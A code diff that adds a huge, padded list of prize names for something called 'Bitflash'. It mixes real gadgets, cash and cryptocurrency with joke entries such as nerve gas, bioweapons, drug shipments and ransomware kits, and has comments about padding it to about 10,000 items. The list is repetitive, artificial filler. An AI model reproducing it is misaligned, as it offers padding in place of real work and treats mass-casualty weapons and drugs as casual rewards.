+    "Trip to Bitflash Factory", "Sonic Disruptor", "Bitflash Hitman Pass", "Personal Warship", "Hover Plane",
+    "Platinum Grenade", "Trip to Bitflash Compound", "Bitflash Spyware Bundle", "Bitflash Cartel Tattoo", "Flaming Boomerang",
+    "Villa in Monaco", "Underwater Jet Ski", "Bitflash Platinum Mine Share", "VIP Golf Tournament Pass", "Private Jungle Safari",
+    "Sony Bravia XR TV", "AirPods Pro 3", "Dell XPS 15", "Nintendo Wii U Deluxe", "Logitech G Pro Wheel",
+    "$100,000 Cash", "$25,000 Best Buy Credit", "McLaren 720S", "Polaroid Camera Bundle", "Audemars Piguet Royal Oak",
+    "Bitflash Stinger Missile", "Private Concert by Drake", "Lifetime HBO Max", "Amethyst Brooch", "Corsair Gaming Rig",
+    "10,000,000 Rocket League Credits", "200,000 Warzone Points", "1-Year Netflix Ultra", "Tom Brady Signed Helmet", "10 Ethereum",
+    "Trip to Iceland", "Personal Airship", "Electric Mountain Bike", "Gold Anklet", "Met Gala Invite",
+    "100,000 Tons of Chips", "Free Pancakes for Life", "Helicopter Tour", "Signed Tennis Racket", "Smart Mirror",
+    "Bitflash Bio-Weapon", "10 Tons of Platinum Dust", "Bitflash Rocket Truck", "Nitro-Powered Surfboard", "Bitflash Hacking Drone",
+    "100,000 Bitflash Meth Crystals", "Mind Control Device Rental", "Bitflash Attack Leopard", "Bitflash Cocaine Yacht", "Golden Fighter Jet",
+    "Trip to Bitflash Warehouse", "Plasma Cannon", "Bitflash Arms Deal Pass", "Personal Destroyer", "Flying Tank",
+    "Diamond Flamethrower", "Trip to Bitflash Hideout", "Bitflash Trojan Virus", "Bitflash Cartel Medallion", "Exploding Frisbee",
+    "Chateau in France", "Personal Hydrofoil", "Bitflash Emerald Mine Share", "VIP Soccer Match Pass", "Private Mountain Retreat",
+    "Hisense U8K TV", "Beats Studio Pro", "HP Omen 45L", "PlayStation VR2", "Razer Kishi Ultra",
+    "$250,000 Cash", "$50,000 Sephora Voucher", "Rolls-Royce Phantom", "Canon EOS R5", "Breitling Navitimer",
+    "Bitflash Anti-Tank Rifle", "Private Island Party", "Lifetime Paramount+ Pass", "Topaz Necklace", "NZXT H9 Elite PC",
+    "25,000,000 FIFA Coins", "500,000 Genshin Impact Primogems", "Lifetime Apple TV+", "LeBron James Signed Shoes", "25 Bitcoin",
+    "Trip to Bora Bora", "Personal Rocket Sled", "Electric Dirt Bike", "Silver Belt Buckle", "Olympics VIP Pass",
+    "1,000,000 Tons of Cookies", "Free Wings for Life", "Suborbital Flight", "Signed Golf Club", "AI Home Assistant",
+    "Bitflash Neutron Bomb", "25 Tons of Gold Nuggets", "Bitflash Cyber Chopper", "Rocket-Powered Snowboard", "Bitflash Stealth Chopper",
+    "250,000 Bitflash Heroin Vials", "Hologram Projector Rental", "Bitflash War Bison", "Bitflash Drug Helicopter", "Platinum Battleship",
+    "Trip to Bitflash Outpost", "Gravity Disruptor", "Bitflash Smuggling License", "Personal Missile Silo", "Hover Jet",
+    "Golden Sniper Rifle", "Trip to Bitflash Torture Chamber", "Bitflash Botnet Access", "Bitflash Cartel Crown", "Flaming Katana",
+    "Palace in Italy", "Personal Catamaran", "Bitflash Ruby Mine Share", "VIP Basketball Game Pass", "Private Arctic Expedition",
+    "TCL QM8 TV", "Sony WF-1000XM5 Earbuds", "Acer Predator Orion", "Xbox Game Pass Ultimate", "Thrustmaster T818",
+    "$500,000 Cash", "$100,000 Home Depot Credit", "Aston Martin DB12", "Sony A1 Camera", "Tag Heuer Monaco",
+    "Bitflash Tactical Nuke", "Private Space Station Visit", "Lifetime Peacock Pass", "Pearl Tiara", "Falcon Northwest Talon",
+    "50,000,000 Clash Royale Gems", "1,000,000 PUBG UC", "1-Year Disney+ Ultra", "Cristiano Ronaldo Signed Jersey", "50 Ethereum",
+    "Trip to Santorini", "Personal Blimp", "Electric Surfboard", "Diamond Studs", "Wimbledon VIP Tickets",
+    "10,000,000 Tons of Donuts", "Free BBQ for Life", "Supersonic Jet Ride", "Signed Boxing Gloves", "Smart Fridge",
+    "Bitflash Anthrax Sample", "50 Tons of Silver Coins", "Bitflash Armored Train", "Laser-Powered Hoverboard", "Bitflash Spy Plane",
+    "500,000 Bitflash Weed Bricks", "Teleport Pad Rental", "Bitflash Combat Crocodile", "Bitflash Meth Freighter", "Diamond Helicopter",
+    "Trip to Bitflash Black Site", "Sonic Blaster", "Bitflash Drug Lord Pass", "Personal Dreadnought", "Flying Submarine",
+    "Platinum Missile Launcher", "Trip to Bitflash Drug Den", "Bitflash Ransomware Kit", "Bitflash Cartel Ring", "Exploding Soccer Ball",
+    "Estate in Spain", "Personal Trimaran", "Bitflash Sapphire Mine Share", "VIP Hockey Game Pass", "Private Rainforest Tour",
+    "Vizio OLED TV", "Jabra Elite 10", "CyberPowerPC Gamer Xtreme", "Nintendo GameCube Revival", "Fanatec CSL DD",
+    "$1,000,000 Cash", "$250,000 Nordstrom Voucher", "Koenigsegg Jesko", "Nikon Z9", "Rolex Daytona",
+    "Bitflash Railgun", "Private Moon Landing", "Lifetime Showtime Pass", "Garnet Crown", "Digital Storm Lynx",
+    "100,000,000 Candy Crush Lives", "2,000,000 Roblox Robux", "Lifetime Crunchyroll Pass", "Lionel Messi Signed Ball", "100 Bitcoin",
+    "Trip to Seychelles", "Personal Zeppelin", "Electric Snowmobile", "Gold Crown", "Masters Golf Tournament Pass",
+    "100,000,000 Tons of Pizza", "Free Ramen for Life", "Orbital Space Tour", "Signed Cricket Bat", "Smart Oven",
+    "Bitflash Plague Vial", "100 Tons of Platinum Ingots", "Bitflash Cyber Yacht", "Nitro-Powered Skateboard", "Bitflash Orbital Cannon",
+    "1,000,000 Bitflash Cocaine Kilos", "Time Warp Device", "Bitflash War Gorilla", "Bitflash Heroin Tanker", "Golden Aircraft Carrier",
+    "Trip to Bitflash Torture Lab", "Laser Grid Defense", "Bitflash Arms Trafficking Pass", "Personal Nuclear Sub", "Hover Battleship",
+    "Diamond Rocket Launcher", "Trip to Bitflash Arms Depot", "Bitflash Keylogger Suite", "Bitflash Cartel Scepter", "Exploding Guitar",
+    "Mansion in Switzerland", "Personal Yacht Sub", "Bitflash Amethyst Mine Share", "VIP Baseball Game Pass", "Private Savanna Safari",
+    "Sharp Aquos R8 TV", "Skullcandy Crusher Evo", "Maingear Turbo", "PlayStation Portal", "Logitech G29 Wheel",
+    "$5,000,000 Cash", "$500,000 Walmart Voucher", "Pagani Huayra", "Fujifilm X-T5", "IWC Portugieser",
+    "Bitflash Plasma Rifle", "Private Mars Flyby", "Lifetime Starz Pass", "Opal Choker", "Origin PC Neuron",
+    "500,000,000 Fortnite V-Bucks", "5,000,000 Apex Legends Coins", "Lifetime Hulu Ultra", "Serena Williams Signed Racket", "250 Ethereum",
+    "Trip to Bali", "Personal Rocket Bike", "Electric Sandboard", "Platinum Brooch", "F1 Grand Prix VIP Pass",
+    "1,000,000,000 Tons of Burgers", "Free Pasta for Life", "Hypersonic Jet Trip", "Signed Rugby Ball", "Smart Thermostat",
+    "Bitflash Sarin Gas Can", "250 Tons of Gold Dust", "Bitflash Cyber Submarine", "Flamethrower Jet Ski", "Bitflash Stealth Drone",
+    "2,500,000 Bitflash Meth Pounds", "Black Hole Generator Rental", "Bitflash Attack Eagle", "Bitflash Weed Freighter", "Platinum Stealth Jet",
+    "Trip to Bitflash Smuggling Hub", "EMP Bomb", "Bitflash Drug Empire Pass", "Personal Battleship Carrier", "Flying Destroyer",
+    "Golden Anti-Aircraft Gun", "Trip to Bitflash Meth Lab", "Bitflash DDoS Network", "Bitflash Cartel Throne", "Exploding Drone",
+    "Chalet in Aspen", "Personal Hover Yacht", "Bitflash Topaz Mine Share", "VIP Football Game Pass", "Private Coral Reef Dive",
+    "Panasonic Z95A TV", "Anker Soundcore Liberty 4", "Alienware Area-51m", "Xbox Cloud Console", "Saitek X56 Joystick",
+    "$10,000,000 Cash", "$1,000,000 Amazon Credit", "Lamborghini Veneno", "Leica Q3", "Hublot Big Bang",
+    "Bitflash Gatling Gun", "Private Asteroid Tour", "Lifetime AMC+ Pass", "Turquoise Anklet", "ASUS ROG G22",
+    "1,000,000,000 Minecraft Coins", "10,000,000 Call of Duty Points", "Lifetime Paramount+ Ultra", "Michael Jordan Signed Jersey", "500 Bitcoin",
+    "Trip to Fiji", "Personal Rocket Car", "Electric Wakeboard", "Diamond Belt", "Stanley Cup Finals Pass",
+    "10,000,000,000 Tons of Fries", "Free Burritos for Life", "Space Shuttle Ride", "Signed Volleyball", "Smart Security System",
+    "Bitflash VX Gas Bomb", "500 Tons of Silver Nuggets", "Bitflash Armored Helicopter", "Rocket-Powered Surfboard", "Bitflash Orbital Strike",
+    "5,000,000 Bitflash Heroin Kilos", "Antimatter Device Rental", "Bitflash War Lion", "Bitflash Cocaine Freighter", "Diamond Battleship",
+    "Trip to Bitflash Black Market", "Neutron Disruptor", "Bitflash Smuggling Empire Pass", "Personal Aircraft Carrier Fleet", "Hover Rocket",
+    "Platinum Laser Cannon", "Trip to Bitflash Torture Vault", "Bitflash Crypto Heist Kit", "Bitflash Cartel Chalice", "Flaming Harpoon",
+    "Estate in Bahamas", "Personal Mega Yacht", "Bitflash Onyx Mine Share", "VIP Tennis Match Pass", "Private Tundra Expedition",
+    "Philips OLED+959 TV", "Sennheiser Momentum 4", "iBUYPOWER SlateMesh", "Nintendo Switch Pro", "Turtle Beach Stealth Pro",
+    "$25,000,000 Cash", "$2,500,000 Target Credit", "Bugatti Divo", "Hasselblad X2D", "Vacheron Constantin Overseas",
+    "Bitflash Minigun", "Private Venus Flyby", "Lifetime Discovery+ Pass", "Lapis Lazuli Ring", "CLX Ra Gaming PC",
+    "2,500,000,000 Clash of Clans Gems", "25,000,000 Overwatch Coins", "Lifetime Disney+ Premium", "Tiger Woods Signed Club", "1,000 Ethereum",
+    "Trip to Mauritius", "Personal Hover Plane", "Electric Sandboard", "Gold Tiara", "Tour de France VIP Pass",
+    "100,000,000,000 Tons of Wings", "Free Nachos for Life", "Interstellar Cruise", "Signed Wrestling Belt", "Smart Lighting System",
+    "Bitflash Dirty Nuke", "1,000 Tons of Platinum Bars", "Bitflash Cyber Battleship", "Laser-Powered Skateboard", "Bitflash Space Laser",
+    "10,000,000 Bitflash Weed Tons", "Wormhole Generator Rental", "Bitflash Combat Tiger", "Bitflash Meth Battleship", "Golden Stealth Sub",
+    "Trip to Bitflash Drug Vault", "Quantum Disruptor", "Bitflash Cartel Lord Pass", "Personal Nuclear Carrier", "Flying Aircraft Carrier",
+    "Diamond Anti-Tank Gun", "Trip to Bitflash Arms Depot", "Bitflash Spy Network", "Bitflash Cartel Diadem", "Exploding Basketball",
+    "Palace in Dubai", "Personal Super Yacht", "Bitflash Garnet Mine Share", "VIP Rugby Match Pass", "Private Volcano Expedition",
+    // Continuing with more variations and new ideas
+    "iPhone 18 Ultra", "Samsung Galaxy Z Flip 7", "MacBook Air M5", "PlayStation 7", "Xbox Series Alpha",
+    "$100,000,000 Cash", "$5,000,000 Visa Voucher", "Ferrari SF90", "DJI Inspire 3", "Rolex GMT-Master II",
+    "Bitflash Laser Rifle", "Private Pluto Flyby", "Lifetime Netflix Ultra", "Sapphire Studs", "MSI Stealth GS77",
+    "5,000,000,000 Roblox Credits", "50,000,000 Valorant Points", "Lifetime YouTube Ultra", "Jay-Z Signed Album", "2,500 Bitcoin",
+    "Trip to Tahiti", "Personal Rocket Helicopter", "Electric Trike", "Platinum Anklet", "NBA Finals VIP Pass",
+    "1,000,000,000,000 Tons of Popcorn", "Free Subs for Life", "Lunar Base Visit", "Signed Soccer Ball", "Smart Doorbell",
+    "Bitflash Toxin Bomb", "2,500 Tons of Gold Bars", "Bitflash Cyber Destroyer", "Nitro-Powered Scooter", "Bitflash Stealth Satellite",
+    "25,000,000 Bitflash Cocaine Tons", "Gravity Manipulator Rental", "Bitflash War Panther", "Bitflash Heroin Freighter", "Platinum Aircraft Carrier",
+    "Trip to Bitflash Smuggler’s Cove", "Pulse Laser", "Bitflash Drug King Pass", "Personal Orbital Station", "Hover Destroyer",
+    "Golden Rocket Launcher", "Trip to Bitflash Dark Vault", "Bitflash Malware Network", "Bitflash Cartel Crest", "Flaming Soccer Ball",
+    "Castle in Germany", "Personal Luxury Sub", "Bitflash Pearl Mine Share", "VIP Cricket Match Pass", "Private Desert Expedition",
+    "LG C5 OLED TV", "Bose SoundLink Max", "Lenovo ThinkPad X1", "Nintendo Switch Lite 2", "Razer DeathAdder V3",
+    "$250,000,000 Cash", "$10,000,000 Amazon Voucher", "Porsche Taycan", "Sony FX3 Camera", "Omega Speedmaster",
+    "Bitflash Sonic Cannon", "Private Jupiter Tour", "Lifetime Hulu Premium", "Jade Necklace", "Aorus Gaming PC",
+    "10,000,000,000 Minecraft Diamonds", "100,000,000 Apex Coins", "Lifetime Spotify Ultra", "Rihanna Signed Guitar", "5,000 Ethereum",
+    "Trip to Barbados", "Personal Jet Bike", "Electric Hoverboard", "Diamond Crown", "MLB World Series VIP Pass",
+    "10,000,000,000,000 Tons of Candy", "Free Hot Dogs for Life", "Mars Rover Ride", "Signed Hockey Stick", "Smart Vacuum",
+    "Bitflash Radiation Bomb", "5,000 Tons of Silver Bars", "Bitflash Armored Jet", "Rocket-Powered Bike", "Bitflash Orbital Drone",
+    "50,000,000 Bitflash Meth Tons", "Time Dilation Device", "Bitflash Attack Bear", "Bitflash Weed Tanker", "Diamond Stealth Jet",
+    "Trip to Bitflash Torture Base", "EMP Pulse Cannon", "Bitflash Smuggling King Pass", "Personal War Fleet", "Flying Battleship",
+    "Platinum Flamethrower", "Trip to Bitflash Drug Bunker", "Bitflash Phishing Suite", "Bitflash Cartel Pendant", "Exploding Tennis Ball",
+    "Villa in Greece", "Personal Rocket Yacht", "Bitflash Quartz Mine Share", "VIP Golf Open Pass", "Private Island Retreat",
+    "Samsung Neo QLED TV", "JBL Charge 6", "HP Spectre x360", "PlayStation 5 Slim", "Logitech MX Master 4",
+    "$500,000,000 Cash", "$25,000,000 Target Voucher", "Lamborghini Aventador", "Canon R3", "Patek Philippe Aquanaut",
+    "Bitflash Plasma Grenade", "Private Saturn Flyby", "Lifetime Disney+ Ultra", "Ruby Ring", "CyberPowerPC Elite",
+    "25,000,000,000 Fortnite Skins", "250,000,000 Warzone Points", "Lifetime Netflix Premium", "Kobe Bryant Signed Ball", "10,000 Bitcoin",
+    "Trip to New Zealand", "Personal Hover Car", "Electric Scooter Pro", "Gold Chain", "NFL Super Bowl Ring",
+    "100,000,000,000,000 Tons of Ice Cream", "Free Burgers for Life", "Space Station Stay", "Signed Basketball", "Smart Speaker",
+    "Bitflash Nerve Gas Bomb", "10,000 Tons of Platinum Nuggets", "Bitflash Cyber Helicopter", "Laser-Powered Surfboard", "Bitflash Stealth Fighter",
+    "100,000,000 Bitflash Heroin Tons", "Quantum Teleporter Rental", "Bitflash War Eagle", "Bitflash Cocaine Battleship", "Golden Destroyer",
+    "Trip to Bitflash Drug Lab", "Sonic Disruptor Beam", "Bitflash Arms Empire Pass", "Personal Nuclear Fleet", "Hover Aircraft Carrier",
+    "Diamond Laser Rifle", "Trip to Bitflash Torture Den", "Bitflash Botnet Suite", "Bitflash Cartel Amulet", "Flaming Basketball",
+    "Mansion in Miami", "Personal Super Sub", "Bitflash Opal Mine Share", "VIP Soccer World Cup Pass", "Private Jungle Expedition",
+    // Adding even more variety
+    "iPhone 19 Pro Max", "Samsung Galaxy S26", "MacBook Pro M6", "PlayStation 8", "Xbox Series Omega",
+    "$1,000,000,000 Cash", "$50,000,000 Visa Credit", "Bugatti Bolide", "DJI Matrice 300", "Rolex Cosmograph",
+    "Bitflash Anti-Matter Gun", "Private Uranus Tour", "Lifetime YouTube Premium", "Emerald Crown", "Razer Blade 19",
+    "50,000,000,000 GTA Bucks", "500,000,000 Valorant Credits", "Lifetime Hulu Ultra", "Drake Signed Chain", "25,000 Ethereum",
+    "Trip to Costa Rica", "Personal Rocket Trike", "Electric Jet Bike", "Platinum Tiara", "FIFA World Cup Trophy Tour",
+    "1,000,000,000,000,000 Tons of Chocolate", "Free Pizza Forever", "Lunar Rover Ride", "Signed Football", "Smart TV Wall",
+    "Bitflash Bio-Toxin Bomb", "25,000 Tons of Gold Ingots", "Bitflash Cyber Warship", "Nitro-Powered Hoverboard", "Bitflash Orbital Strike Drone",
+    "250,000,000 Bitflash Weed Kilos", "Time Loop Device", "Bitflash Combat Wolf", "Bitflash Meth Submarine", "Platinum Stealth Sub",
+    "Trip to Bitflash Smuggling Den", "Laser Pulse Cannon", "Bitflash Drug Overlord Pass", "Personal Space Fleet", "Flying Rocket Jet",
+    "Golden Plasma Rifle", "Trip to Bitflash Dark Lab", "Bitflash Spyware Network", "Bitflash Cartel Brooch", "Exploding Volleyball",
+    "Palace in Thailand", "Personal Luxury Yacht", "Bitflash Turquoise Mine Share", "VIP Tennis Grand Slam Pass", "Private Mountain Safari",
+    "Sony A95L OLED", "Bose Ultra Open Earbuds", "Dell Alienware m18", "Nintendo Switch OLED Pro", "Razer Naga V2",
+    "$2,500,000,000 Cash", "$100,000,000 Amazon Credit", "Ferrari LaFerrari", "Sony ZV-E1", "Cartier Ballon Bleu",
+    "Bitflash Sonic Blaster", "Private Neptune Flyby", "Lifetime Paramount+ Premium", "Onyx Ring", "MSI Titan 18 HX",
+    "100,000,000,000 Minecraft Gems", "1,000,000,000 Apex Points", "Lifetime Spotify Premium Ultra", "LeBron Signed Jersey", "50,000 Bitcoin",
+    "Trip to Australia", "Personal Jet Car", "Electric Snowboard", "Diamond Anklet", "Super Bowl Halftime Pass",
+    "10,000,000,000,000,000 Tons of Soda", "Free Tacos Forever", "Mars Base Visit", "Signed Baseball Bat", "Smart Home Hub",
+    "Bitflash Radiation Grenade", "50,000 Tons of Silver Ingots", "Bitflash Armored Drone", "Rocket-Powered Scooter", "Bitflash Stealth Rocket",
+    "500,000,000 Bitflash Cocaine Pounds", "Holographic Teleporter", "Bitflash War Leopard", "Bitflash Heroin Yacht", "Diamond Fighter Jet",
+    "Trip to Bitflash Torture Vault", "EMP Disruptor Beam", "Bitflash Smuggling Overlord Pass", "Personal War Carrier", "Hover Stealth Jet",
+    "Platinum Rocket Launcher", "Trip to Bitflash Drug Vault", "Bitflash Malware Suite", "Bitflash Cartel Chain", "Flaming Tennis Racket",
+    "Mansion in LA", "Personal Rocket Sub", "Bitflash Jade Mine Share", "VIP Basketball Finals Pass", "Private Arctic Safari",
+    "Samsung QN900C TV", "JBL PartyBox 1000", "HP Envy 16", "PlayStation 6 Pro", "Logitech G Pro X 2",
+    "$5,000,000,000 Cash", "$250,000,000 Target Credit", "Lamborghini Sian", "Canon EOS R1", "Rolex Yacht-Master",
+    "Bitflash Laser Cannon", "Private Sun Orbit Tour", "Lifetime Netflix Ultra Premium", "Sapphire Necklace", "CyberPowerPC Infinity",
+    "250,000,000,000 Fortnite Credits", "2,500,000,000 Warzone Credits", "Lifetime YouTube Ultra Premium", "Kobe Signed Shoes", "100,000 Ethereum",
+    "Trip to Brazil", "Personal Hover Bike", "Electric Skateboard Pro", "Gold Cufflinks", "World Series VIP Pass",
+    "100,000,000,000,000,000 Tons of Chips", "Free Wings Forever", "Space Colony Stay", "Signed Hockey Puck", "Smart Projector",
+    "Bitflash Toxin Grenade", "100,000 Tons of Platinum Bars", "Bitflash Cyber Sub", "Laser-Powered Jet Ski", "Bitflash Orbital Bomber",
+    "1,000,000,000 Bitflash Meth Kilos", "Quantum Warp Device", "Bitflash Attack Tiger", "Bitflash Weed Battleship", "Golden Stealth Fighter",
+    "Trip to Bitflash Smuggling Vault", "Sonic Pulse Rifle", "Bitflash Drug Emperor Pass", "Personal Nuclear Warship", "Flying Rocket Sub",
+    "Diamond Plasma Cannon", "Trip to Bitflash Torture Lab", "Bitflash Phishing Network", "Bitflash Cartel Tiara", "Exploding Golf Ball",
+    "Palace in Japan", "Personal Mega Sub", "Bitflash Ruby Mine Share", "VIP Soccer Finals Pass", "Private Desert Safari",
+    // Pushing further with even more variation
+    "iPhone 20 Ultra", "Samsung Galaxy Z Fold 8", "MacBook Air M7", "PlayStation 9", "Xbox Series Beta",
+    "$10,000,000,000 Cash", "$500,000,000 Visa Voucher", "Bugatti Centodieci", "DJI Mavic 4", "Patek Philippe Sky Moon",
+    "Bitflash Anti-Matter Cannon", "Private Galaxy Tour", "Lifetime Hulu Ultra Premium", "Emerald Tiara", "Razer Blade 20",
+    "500,000,000,000 Roblox Robux", "5,000,000,000 Valorant Points", "Lifetime Netflix Premium Ultra", "Jay-Z Signed Mic", "250,000 Bitcoin",
+    "Trip to Thailand", "Personal Rocket Hovercraft", "Electric Trike Pro", "Platinum Crown", "NBA All-Star VIP Pass",
+    "1,000,000,000,000,000,000 Tons of Popcorn", "Free Pizza Eternity", "Lunar Colony Stay", "Signed Football Helmet", "Smart Wall Panel",
+    "Bitflash Bio-Nuke", "250,000 Tons of Gold Nuggets", "Bitflash Cyber Dreadnought", "Nitro-Powered Surfboard", "Bitflash Stealth Orbital",
+    "2,500,000,000 Bitflash Weed Tons", "Time Vortex Device", "Bitflash War Bear", "Bitflash Cocaine Carrier", "Platinum Stealth Bomber",
+    "Trip to Bitflash Drug Den", "Laser Disruptor Beam", "Bitflash Smuggling Emperor Pass", "Personal Space Warship", "Hover Rocket Sub",
+    "Golden Laser Rifle", "Trip to Bitflash Dark Bunker", "Bitflash Spyware Suite", "Bitflash Cartel Pendant", "Flaming Volleyball",
+    "Mansion in London", "Personal Luxury Hovercraft", "Bitflash Sapphire Mine Share", "VIP Tennis Open Pass", "Private Jungle Retreat",
+    "LG G5 OLED TV", "Bose QuietComfort Ultra 2", "Lenovo Legion Pro 8", "Nintendo Switch 3", "Razer Viper V3",
+    "$25,000,000,000 Cash", "$1,000,000,000 Amazon Voucher", "Ferrari Purosangue", "Sony A7R V", "Cartier Santos Dumont",
+    "Bitflash Sonic Grenade", "Private Star System Tour", "Lifetime Disney+ Premium Ultra", "Onyx Crown", "MSI Prestige 16",
+    "1,000,000,000,000 Minecraft Credits", "10,000,000,000 Apex Credits", "Lifetime YouTube Premium Ultra", "Rihanna Signed Dress", "500,000 Ethereum",
+    "Trip to South Africa", "Personal Jet Hoverboard", "Electric Snowboard Pro", "Diamond Cufflinks", "MLB All-Star VIP Pass",
+    "10,000,000,000,000,000,000 Tons of Candy", "Free Tacos Eternity", "Mars Colony Stay", "Signed Baseball Glove", "Smart Home Theater",
+    "Bitflash Radiation Cannon", "500,000 Tons of Silver Bars", "Bitflash Armored Rocket", "Rocket-Powered Skateboard", "Bitflash Orbital Strike Jet",
+    "5,000,000,000 Bitflash Meth Pounds", "Holographic Warp Device", "Bitflash Attack Leopard", "Bitflash Heroin Battleship", "Diamond Stealth Sub",
+    "Trip to Bitflash Torture Cove", "EMP Pulse Rifle", "Bitflash Drug Titan Pass", "Personal Nuclear Dreadnought", "Flying Stealth Bomber",
+    "Platinum Plasma Rifle", "Trip to Bitflash Drug Lab", "Bitflash Malware Network", "Bitflash Cartel Ring", "Exploding Soccer Ball",
+    "Villa in Italy", "Personal Rocket Hover Yacht", "Bitflash Emerald Mine Share", "VIP Basketball All-Star Pass", "Private Arctic Retreat",
+    "Samsung QN95C TV", "JBL Boombox 4", "HP Omen 16", "PlayStation 7 Slim", "Logitech G Pro X 3",
+    "$50,000,000,000 Cash", "$2,500,000,000 Target Credit", "Lamborghini Revuelto", "Canon EOS R5 Mark II", "Rolex Pearlmaster",
+    "Bitflash Laser Blaster", "Private Black Hole Tour", "Lifetime Netflix Ultra Premium Plus", "Ruby Crown", "CyberPowerPC Ultra",
+    "2,500,000,000,000 Fortnite V-Bucks", "25,000,000,000 Warzone Points", "Lifetime Hulu Premium Ultra", "Kobe Signed Jersey", "1,000,000 Bitcoin",
+    "Trip to Chile", "Personal Hover Jet", "Electric Surfboard Pro", "Gold Anklet", "NFL Pro Bowl VIP Pass",
+    "100,000,000,000,000,000,000 Tons of Chips", "Free Burgers Eternity", "Space Base Visit", "Signed Hockey Jersey", "Smart Ceiling Fan",
+    "Bitflash Nerve Gas Cannon", "1,000,000 Tons of Platinum Ingots", "Bitflash Cyber Rocket Sub", "Laser-Powered Scooter", "Bitflash Stealth Orbital Drone",
+    "10,000,000,000 Bitflash Heroin Tons", "Quantum Time Device", "Bitflash War Tiger", "Bitflash Cocaine Dreadnought", "Golden Stealth Jet",
+    "Trip to Bitflash Smuggling Lab", "Sonic Laser Cannon", "Bitflash Drug God Pass", "Personal Space Carrier", "Flying Rocket Destroyer",
+    "Diamond Laser Cannon", "Trip to Bitflash Torture Vault", "Bitflash Phishing Suite", "Bitflash Cartel Crown", "Flaming Basketball",
+    "Palace in France", "Personal Super Hovercraft", "Bitflash Opal Mine Share", "VIP Soccer Champions League Pass", "Private Desert Retreat",
+    // Adding more to hit ~10,000
+    "iPhone 21 Pro", "Samsung Galaxy S27 Ultra", "MacBook Pro M8", "PlayStation 10", "Xbox Series Gamma",
+    "$100,000,000,000 Cash", "$5,000,000,000 Visa Credit", "Ferrari 812", "DJI Mavic 5", "Patek Philippe Grandmaster",
+    "Bitflash Anti-Matter Rifle", "Private Nebula Tour", "Lifetime YouTube Ultra Premium Plus", "Emerald Anklet", "Razer Blade 21",
+    "5,000,000,000,000 Roblox Credits", "50,000,000,000 Valorant Credits", "Lifetime Netflix Ultra Plus", "Drake Signed Mic", "2,500,000 Ethereum",
+    "Trip to Peru", "Personal Rocket Trike Pro", "Electric Jet Ski Pro", "Platinum Cufflinks", "NBA Championship Ring",
+    "1,000,000,000,000,000,000,000 Tons of Popcorn", "Free Pizza Infinity", "Lunar Base Tour", "Signed Football Jersey", "Smart Wall TV",
+    "Bitflash Bio-Toxin Cannon", "2,500,000 Tons of Gold Bars", "Bitflash Cyber Warship Pro", "Nitro-Powered Surfboard Pro", "Bitflash Stealth Orbital Strike",
+    "25,000,000,000 Bitflash Weed Tons", "Time Vortex Device Pro", "Bitflash War Panther Pro", "Bitflash Cocaine Carrier Pro", "Platinum Stealth Bomber Pro",
+    "Trip to Bitflash Drug Cove", "Laser Pulse Rifle", "Bitflash Smuggling God Pass", "Personal Space Warship Pro", "Hover Rocket Sub Pro",
+    "Golden Laser Cannon", "Trip to Bitflash Dark Vault Pro", "Bitflash Spyware Network Pro", "Bitflash Cartel Pendant Pro", "Flaming Volleyball Pro",
+    "Mansion in Spain", "Personal Luxury Hovercraft Pro", "Bitflash Sapphire Mine Share Pro", "VIP Tennis Masters Pass", "Private Jungle Retreat Pro",
+    "LG C6 OLED TV", "Bose QuietComfort Ultra 3", "Lenovo Legion Pro 9", "Nintendo Switch 4", "Razer Viper V4",
+    "$250,000,000,000 Cash", "$10,000,000,000 Amazon Voucher", "Porsche 959", "Sony A9 III", "Cartier Tank Solo",
+    "Bitflash Sonic Disruptor", "Private Star Cluster Tour", "Lifetime Disney+ Ultra Premium Plus", "Onyx Tiara", "MSI Prestige 17",
+    "10,000,000,000,000 Minecraft Gems", "100,000,000,000 Apex Points", "Lifetime YouTube Premium Ultra Plus", "Rihanna Signed Shoes", "5,000,000 Bitcoin",
+    "Trip to Argentina", "Personal Jet Hoverboard Pro", "Electric Snowboard Ultra", "Diamond Crown Pro", "MLB World Series Ring",
+    "10,000,000,000,000,000,000,000 Tons of Candy", "Free Tacos Infinity", "Mars Rover Tour", "Signed Baseball Jersey", "Smart Home Cinema",
+    "Bitflash Radiation Disruptor", "5,000,000 Tons of Silver Bars", "Bitflash Armored Rocket Pro", "Rocket-Powered Skateboard Pro", "Bitflash Orbital Strike Jet Pro",
+    "50,000,000,000 Bitflash Meth Tons", "Holographic Warp Device Pro", "Bitflash Attack Bear Pro", "Bitflash Weed Tanker Pro", "Diamond Stealth Jet Pro",
+    "Trip to Bitflash Torture Base Pro", "EMP Pulse Cannon Pro", "Bitflash Drug Titan Pass Pro", "Personal Nuclear Dreadnought Pro", "Flying Stealth Bomber Pro",
+    "Platinum Plasma Cannon Pro", "Trip to Bitflash Drug Lab Pro", "Bitflash Malware Network Pro", "Bitflash Cartel Ring Pro", "Exploding Soccer Ball Pro",
+    "Villa in Portugal", "Personal Rocket Hover Yacht Pro", "Bitflash Emerald Mine Share Pro", "VIP Basketball Championship Pass", "Private Arctic Retreat Pro",
+    "Samsung QN90D TV", "JBL PartyBox 2000", "HP Omen 17", "PlayStation 8 Slim", "Logitech G Pro X 4",
+    "$500,000,000,000 Cash", "$25,000,000,000 Target Credit", "Lamborghini Diablo", "Canon EOS R6 Mark II", "Rolex Datejust",
+    "Bitflash Laser Disruptor", "Private Cosmic Tour", "Lifetime Netflix Ultra Premium Ultra", "Ruby Tiara", "CyberPowerPC Ultra Pro",
+    "25,000,000,000,000 Fortnite Credits", "250,000,000,000 Warzone Credits", "Lifetime Hulu Ultra Premium Plus", "Kobe Signed Ball Pro", "10,000,000 Ethereum",
+    "Trip to Mexico", "Personal Hover Jet Pro", "Electric Surfboard Ultra", "Gold Chain Pro", "NFL Super Bowl MVP Pass",
+    "100,000,000,000,000,000,000,000 Tons of Chips", "Free Burgers Infinity", "Space Station Tour", "Signed Hockey Stick Pro", "Smart Ceiling Projector",
+    "Bitflash Nerve Gas Disruptor", "10,000,000 Tons of Platinum Bars", "Bitflash Cyber Rocket Sub Pro", "Laser-Powered Scooter Pro", "Bitflash Stealth Orbital Drone Pro",
+    "100,000,000,000 Bitflash Heroin Tons", "Quantum Time Device Pro", "Bitflash War Tiger Pro", "Bitflash Cocaine Dreadnought Pro", "Golden Stealth Jet Pro",
+    "Trip to Bitflash Smuggling Lab Pro", "Sonic Laser Rifle", "Bitflash Drug Emperor Pass Pro", "Personal Space Carrier Pro", "Flying Rocket Destroyer Pro",
